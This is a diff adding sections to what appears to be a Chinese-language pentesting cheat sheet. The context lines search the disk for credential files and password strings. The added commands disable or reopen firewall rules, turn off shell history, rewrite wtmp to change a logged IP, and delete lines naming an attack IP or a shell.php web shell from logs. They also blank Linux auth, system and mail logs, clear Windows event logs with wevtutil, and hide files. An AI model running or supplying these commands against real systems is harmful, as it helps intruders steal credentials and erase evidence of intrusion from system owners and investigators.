@@ -248,5 +248,69 @@ find / -type f  -name "user*.txt" -or -name "pass*.txt" 2> /dev/null
 find / -type f|egrep -v "*.js"|egrep -v "*.css"|egrep -v "*.html"|egrep -v "*.htm"|egrep -v "*.woff"|egrep -v "*.jar"|egrep -v "*.java"|egrep -v "*.class"|egrep -v "*.properties"|egrep -v "*.MF"|egrep -v "*.tmp"|egrep -v "*.vm"|egrep -v "*.svn*"|egrep -v "*LICENSE*"|egrep -v "*.exe"|egrep -v "*.xml"|egrep -v "*.svg"|xargs egrep -s -i  "*user:|*user=|username:|username=|*pass:|*pass=|password:|password=|passwd:|passwd=|账号：|账号:|用户名：|用户名:|密码：|密码:" --color
 #若需同时执行可以用 & 连接，即'命令1&命令2'
 ```
+```
+netsh advfirewall firewall show rule name=all
+netsh advfirewall firewall add rule name="Open Port" dir=out action=allow protocol=TCP localport=80
+netsh advfirewall firewall add rule name="Open Port" dir=in action=allow protocol=TCP localport=80
+
+netsh advfirewall firewall add rule name="Open Port" dir=out action=allow protocol=UDP localport=53
+
+netsh advfirewall firewall add rule name="Open Port" dir=in action=allow protocol=UDP localport=53
+
+netsh firewall set opmode disable 关闭防火墙
+netsh firewall set opmode enable 开启防火墙
+
+```
+
+```
+unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
+
+    /var/log/btmp   记录所有登录失败信息，使用lastb命令查看
+    /var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看
+    /var/log/wtmp    记录所有用户的登录、注销信息，使用last命令查看
+    /var/log/utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看
+    /var/log/secure   记录与安全相关的日志信息
+    /var/log/message  记录系统启动后的信息和错误日志
+centos 
+utmpdump /var/log/wtmp |sed "s/8.8.8.8/1.1.1.1/g" |utmpdump -r >/tmp/wtmp1 &&\mv  /tmp/wtmp1 /var/log/wtmp
+
+ssh -T root@192.168.0.1 /bin/bash -i
+
+sed  -i '/攻击ip/d'  /var/log/secure    # 删除登录日志攻击ip所在的行
+sed -i 's/192.168.1.1/127.0.0.1/g' /var/log/access.log  # 全局替换访问IP地址
+cat /var/log/nginx/access.log | grep -v shell.php > tmp.log  # 删除入侵相关信息
+cat tmp.log > /var/log/nginx/access.log/  # 把修改过的日志覆盖到原日志文件
+
+
+ echo > /var/log/wtmp //清除用户登录记录
+ echo > /var/log/btmp //清除尝试登录记录
+ echo > /var/log/lastlog //清除最近登录信息
+ echo > /var/log/secure //登录信息
+ echo > /var/log/messages
+ echo > /var/log/syslog //记录系统日志的服务
+ echo > /var/log/xferlog
+ echo > /var/log/auth.log
+ echo > /var/log/user.log
+ cat /dev/null > /var/adm/sylog
+ cat /dev/null > /var/log/maillog
+ cat /dev/null > /var/log/openwebmail.log
+ cat /dev/null > /var/log/mail.info
+ echo > /var/run/utmp
+echo > /root/.bash_history
+history -cw 
+
+
+```
+
+```
+  
+wevtutil cl system
+wevtutil cl application
+wevtutil cl security
+
+reg query HKLM\SOFTWARE\Classes\.tudf /s
+
+attrib +h +s "Server.dat"
+```
 
 # 小结
